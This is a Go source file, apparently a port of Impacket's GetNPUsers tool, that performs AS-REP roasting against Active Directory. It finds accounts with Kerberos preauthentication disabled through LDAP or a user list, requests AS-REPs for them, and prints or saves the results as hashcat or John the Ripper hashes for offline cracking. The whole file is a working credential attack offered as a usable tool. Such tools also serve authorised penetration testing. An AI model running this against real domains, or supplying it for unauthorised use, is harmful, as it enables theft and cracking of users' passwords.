package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"
	"strings"

	"gopacket/pkg/flags"
	"gopacket/pkg/kerberos"
	"gopacket/pkg/ldap"
	"gopacket/pkg/session"
)

func main() {
	// Tool-specific flags (registered before flags.Parse)
	requestFlag := flag.Bool("request", false, "Requests TGT for users and output them in JtR/hashcat format (default False)")
	formatFlag := flag.String("format", "hashcat", "format to save the AS_REQ of users without pre-authentication. Choices: hashcat, john")
	usersFile := flag.String("usersfile", "", "File with user per line to test")

	opts := flags.Parse()

	if opts.TargetStr == "" {
		flag.Usage()
		os.Exit(1)
	}

	// Validate -format value
	if *formatFlag != "hashcat" && *formatFlag != "john" {
		log.Fatalf("[-] Invalid format '%s'. Must be 'hashcat' or 'john'.", *formatFlag)
	}

	// If -outputfile is set, implicitly enable -request (matches Impacket behavior)
	if opts.OutputFile != "" {
		*requestFlag = true
	}

	target, creds, err := session.ParseTargetString(opts.TargetStr)
	if err != nil {
		log.Fatalf("[-] Error parsing target string: %v", err)
	}

	opts.ApplyToSession(&target, &creds)

	if !opts.NoPass {
		if err := session.EnsurePassword(&creds); err != nil {
			log.Fatal(err)
		}
	}

	// Store domain for Kerberos AS-REP requests
	domain := creds.Domain
	if domain == "" {
		log.Fatal("[-] Domain is required. Use: domain/user:pass@target")
	}

	// Determine the KDC host for AS-REP requests
	kdcHost := target.Host
	if creds.DCIP != "" {
		kdcHost = creds.DCIP
	} else if creds.DCHost != "" {
		kdcHost = creds.DCHost
	}

	// Mode 1: -usersfile — skip LDAP, request AS-REPs for users from file
	if *usersFile != "" {
		usernames, err := readUsersFile(*usersFile)
		if err != nil {
			log.Fatalf("[-] Error reading users file: %v", err)
		}
		requestMultipleTGTs(usernames, domain, kdcHost, *formatFlag, opts.OutputFile)
		return
	}

	// Mode 2: -no-pass without Kerberos and with a username — just request this user's TGT
	if !creds.UseKerberos && opts.NoPass && creds.Username != "" {
		fmt.Printf("[*] Getting TGT for %s\n", creds.Username)
		requestMultipleTGTs([]string{creds.Username}, domain, kdcHost, *formatFlag, opts.OutputFile)
		return
	}

	// Mode 3: LDAP query — connect, find vulnerable users, optionally request TGTs
	client := ldap.NewClient(target, &creds)
	defer client.Close()

	fmt.Printf("[*] Connecting to %s...\n", target.Addr())
	if err := client.Connect(false); err != nil {
		log.Fatalf("[-] Connection failed: %v", err)
	}

	// Use UPN format for password auth only (hash and Kerberos need the domain preserved)
	if creds.Hash == "" && !creds.UseKerberos && os.Getenv("GOPACKET_NO_UPN") == "" {
		creds.Username = fmt.Sprintf("%s@%s", creds.Username, creds.Domain)
		creds.Domain = ""
	}

	fmt.Printf("[*] Binding as %s...\n", creds.Username)
	if err := client.Login(); err != nil {
		log.Fatalf("[-] Bind failed: %v", err)
	}
	fmt.Println("[+] Bind successful.")

	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		log.Fatalf("[-] Failed to get Naming Context: %v", err)
	}

	fmt.Printf("[*] Querying %s for vulnerable accounts...\n", target.Host)
	users, err := client.FindNPUsers(baseDN)
	if err != nil {
		log.Fatalf("[-] LDAP search failed: %v", err)
	}

	if len(users) == 0 {
		fmt.Println("[+] No users found with 'Do not require Kerberos preauthentication' set.")
		return
	}

	fmt.Printf("[+] Found %d vulnerable accounts:\n", len(users))
	for _, u := range users {
		fmt.Printf("  %s\n", u.Username)
	}

	// Only request AS-REPs if -request flag is set (or -outputfile was provided)
	if *requestFlag {
		fmt.Println()
		usernames := make([]string, len(users))
		for i, u := range users {
			usernames[i] = u.Username
		}
		requestMultipleTGTs(usernames, domain, kdcHost, *formatFlag, opts.OutputFile)
	}
}

// readUsersFile reads usernames from a file, one per line.
func readUsersFile(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var usernames []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			usernames = append(usernames, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return usernames, nil
}

// requestMultipleTGTs requests AS-REPs for a list of usernames and outputs the hashes.
func requestMultipleTGTs(usernames []string, domain, kdcHost, format, outputFile string) {
	var fd *os.File
	if outputFile != "" {
		var err error
		fd, err = os.Create(outputFile)
		if err != nil {
			log.Fatalf("[-] Error creating output file: %v", err)
		}
		defer fd.Close()
	}

	for _, username := range usernames {
		fmt.Printf("[*] Requesting AS-REP for %s...\n", username)
		hash, err := kerberos.GetASREP(username, domain, kdcHost, format)
		if err != nil {
			fmt.Printf("    [-] Failed: %v\n", err)
			continue
		}
		fmt.Printf("%s\n", hash)
		if fd != nil {
			fd.WriteString(hash + "\n")
		}
	}

	if outputFile != "" {
		fmt.Printf("[*] Hashes written to %s\n", outputFile)
	}
}
